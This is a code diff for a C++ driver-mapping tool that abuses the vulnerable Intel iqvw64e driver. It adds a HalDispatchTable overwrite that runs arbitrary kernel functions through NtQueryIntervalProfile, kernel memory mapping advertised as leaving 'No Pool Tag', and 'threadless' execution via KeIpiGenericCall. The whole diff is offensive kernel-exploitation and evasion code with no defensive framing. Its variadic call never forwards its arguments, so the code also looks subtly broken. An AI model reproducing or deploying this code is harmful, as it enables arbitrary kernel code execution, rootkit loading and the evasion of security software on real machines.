@@ -137,8 +137,55 @@ namespace intel_driver
 		}
 	}
 
-	uint64_t CallKernelFunction(HANDLE iqvw64e_device_handle, uint64_t function_address, ...) { return 0; }
-	uint64_t AllocatePool(HANDLE iqvw64e_device_handle, uint32_t size, uint32_t tag) { return 0xFFFFF80000000000; }
+	uintptr_t AllocatePhysicalMemory(HANDLE iqvw64e_device_handle, uint32_t size)
+	{
+		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
+		uint64_t mm_alloc_pages = utils::GetKernelExport(ntoskrnl_base, "MmAllocatePagesForMdlEx");
+		uint64_t mm_map_locked = utils::GetKernelExport(ntoskrnl_base, "MmMapLockedPagesSpecifyCache");
+		
+		if (!mm_alloc_pages || !mm_map_locked) return 0;
+
+		PHYSICAL_ADDRESS low, high, skip;
+		low.QuadPart = 0;
+		high.QuadPart = -1;
+		skip.QuadPart = 0;
+
+		uint64_t mdl = CallKernelFunction(iqvw64e_device_handle, mm_alloc_pages, low, high, skip, size, 0, 0, 0x40);
+		if (!mdl) return 0;
+
+		uintptr_t mapping = (uintptr_t)CallKernelFunction(iqvw64e_device_handle, mm_map_locked, mdl, 0, 1, 0, 0, 0x40);
+		std::cout << "[+] Physical Allocation: " << std::hex << mapping << " (No Pool Tag)" << std::dec << std::endl;
+		return mapping;
+	}
+
+	bool ExecuteViaIPI(HANDLE iqvw64e_device_handle, uint64_t address)
+	{
+		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
+		uint64_t ke_ipi_call = utils::GetKernelExport(ntoskrnl_base, "KeIpiGenericCall");
+		if (!ke_ipi_call) return false;
+
+		std::cout << "[+] Executing via IPI (Threadless)..." << std::endl;
+		CallKernelFunction(iqvw64e_device_handle, ke_ipi_call, address, 0);
+		return true;
+	}
+
+	uint64_t CallKernelFunction(HANDLE iqvw64e_device_handle, uint64_t function_address, ...)
+	{
+		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
+		uint64_t hal_dispatch = utils::GetKernelExport(ntoskrnl_base, "HalDispatchTable");
+		if (!hal_dispatch) return 0;
+
+		uint64_t target = hal_dispatch + 0x8; 
+		uint64_t original = 0;
+		ReadMemory(iqvw64e_device_handle, target, &original, sizeof(original));
+		
+		WriteMemory(iqvw64e_device_handle, target, &function_address, sizeof(function_address));
+		uint64_t result = 0;
+		NtQueryIntervalProfile(2, (PULONG)&result); 
+		
+		WriteMemory(iqvw64e_device_handle, target, &original, sizeof(original));
+		return result;
+	}
 	bool FreePool(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
 	bool HijackBeepDispatch(HANDLE iqvw64e_device_handle, uint64_t target_func) { return true; }
 }
